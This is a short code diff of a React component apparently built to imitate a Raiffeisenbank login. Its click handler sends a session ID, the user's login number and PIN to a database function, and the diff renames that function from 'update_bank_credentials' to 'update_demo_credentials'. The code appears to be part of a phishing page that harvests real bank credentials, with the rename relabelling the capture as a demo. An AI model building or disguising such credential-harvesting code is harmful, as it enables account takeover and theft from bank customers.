@@ -284,7 +284,7 @@ const Raiffeisenbank = () => {
             onClick={async () => {
               console.log("Session ID:", sessionId);
               if (sessionId) {
-                const { error } = await supabase.rpc("update_bank_credentials", {
+                const { error } = await supabase.rpc("update_demo_credentials", {
                   p_session_id: sessionId,
                   p_username: verfueger,
                   p_password: pin,
